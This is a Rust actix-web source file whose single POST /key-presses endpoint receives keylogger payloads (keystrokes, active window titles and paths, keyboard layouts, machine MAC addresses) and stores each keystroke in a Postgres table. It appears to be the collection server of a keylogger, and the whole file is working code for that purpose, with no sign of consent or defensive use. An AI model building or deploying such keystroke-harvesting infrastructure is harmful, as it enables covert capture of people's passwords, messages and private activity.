use actix_web::{http::StatusCode, post, web, HttpResponse};
use chrono::{DateTime, Utc};
use serde::Deserialize;
use sqlx::{Pool, Postgres};
use uuid::Uuid;

use crate::api_error::ApiError;

#[derive(Deserialize, Debug)]
pub struct KeyLoggerPayload {
    mac_addresses: Vec<Vec<i32>>,
    key_presses: Vec<KeyPressInfo>,
}

#[derive(Deserialize, Debug)]
struct KeyPressInfo {
    timestamp: DateTime<Utc>,
    window_path: String,
    window_title: String,
    keyboard_layout: String,
    key_pressed: String,
}

#[post("/key-presses")]
pub async fn post_key_press_info(
    pool: web::Data<Pool<Postgres>>,
    input: web::Json<KeyLoggerPayload>,
) -> Result<HttpResponse, ApiError> {
    if !input.key_presses.is_empty() {
        for key_press in input.key_presses.iter() {
            sqlx::query::<sqlx::Postgres>("
                INSERT INTO key_press_info(id,mac_address,window_path,window_title,keyboard_layout,key_pressed,created_at)
                VALUES($1,$2,$3,$4,$5,$6,$7);
            ")
            .bind(Uuid::new_v4())
            .bind(input.mac_addresses[0].clone())
            .bind(key_press.window_path.clone())
            .bind(key_press.window_title.clone())
            .bind(key_press.keyboard_layout.clone())
            .bind(key_press.key_pressed.clone())
            .bind(key_press.timestamp)
            .execute(pool.as_ref())
            .await?;
        }
    }
    Ok(HttpResponse::build(StatusCode::OK).finish())
}
